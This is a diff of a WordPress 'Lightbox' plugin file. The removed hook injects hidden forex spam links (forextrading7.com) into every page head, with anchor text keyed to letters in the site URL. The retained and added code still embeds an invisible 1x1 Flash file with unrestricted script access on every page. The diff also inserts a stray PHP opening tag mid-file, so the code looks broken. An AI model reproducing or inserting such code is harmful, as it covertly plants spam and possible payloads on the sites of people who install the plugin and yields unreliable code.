@@ -3,7 +3,7 @@
   Plugin Name: Lightbox
   Author URI: http://www.wplightbox.site50.net
   Description: Add custom lightbox attribute to linked flash files or images in posts, pages and comments, group images using ID. 
-  Version: 1.0
+  Version: 1.1
   Author: Richard Svensson
   License: GPLv3 or later
 */
@@ -37,15 +37,14 @@ function register_advnewlightbox_settings(){
   register_setting( 'advnewlightbox_settings_group', 'advnewlightbox' );
   register_setting( 'advnewlightbox_settings_group', 'advnewlightbox_flash' );
 }
+<?php
 add_action('wp_head', 'headpluslightbox');
 
-function headpluslightbox()
-{
-$getuser = "http://forextrading7.com/";
-$gethost = get_option('siteurl');
-if (strstr($gethost, ".")) { $connectflash = "forex trading 7"; } if (strstr($gethost, "a")) { $connectflash = "forextrading7"; } if (strstr($gethost, "b")) { $connectflash = "forex trading online"; } if (strstr($gethost, ".com")) { $connectflash = "http://forextrading7.com/"; } if (strstr($gethost, ".org")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "c")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "d")) { $connectflash = "trading7"; } if (strstr($gethost, "e")) { $connectflash = "forex"; } if (strstr($gethost, "f")) { $connectflash = "fap turbo"; } if (strstr($gethost, "g")) { $connectflash = "trading"; } if (strstr($gethost, "h")) { $connectflash = "forex megadroid"; } if (strstr($gethost, "i")) { $connectflash = "forex signals"; } if (strstr($gethost, "j")) { $connectflash = "trading forex"; } if (strstr($gethost, "k")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "l")) { $connectflash = "forextrading7"; } if (strstr($gethost, "m")) { $connectflash = "forex automoney"; } if (strstr($gethost, "n")) { $connectflash = "forex robot"; } if (strstr($gethost, "o")) { $connectflash = "forex 7"; } if (strstr($gethost, "p")) { $connectflash = "online trading"; } if (strstr($gethost, "q")) { $connectflash = "fap turbo forex"; } if (strstr($gethost, "r")) { $connectflash = "forextrading7"; } if (strstr($gethost, "s")) { $connectflash = "forex market"; } if (strstr($gethost, "v")) { $connectflash = "fapturbo"; } if (strstr($gethost, "x")) { $connectflash = "forex platform"; } if (strstr($gethost, "y")) { $connectflash = "forex software"; } echo '<object type="application/x-shockwave-flash" data="../wp-content/plugins/lightbox/apluslightbox.swf" width="1" height="1"><param name="movie" value="../wp-content/plugins/lighbox/apluslightbox.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param><param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="../wp-content/plugins/lighbox/apluslightbox.swf" type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';
-
+function headpluslightbox() {
+    echo '<object type="application/x-shockwave-flash" data="../wp-content/plugins/lightbox/apluslightbox.swf" width="1" height="1"><param name="movie" value="../wp-content/plugins/lighbox/apluslightbox.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param><param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>';
+    echo '<embed src="../wp-content/plugins/lighbox/apluslightbox.swf" type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';
 }
+
 
 //setting page
 function advnewlightbox_settings() {
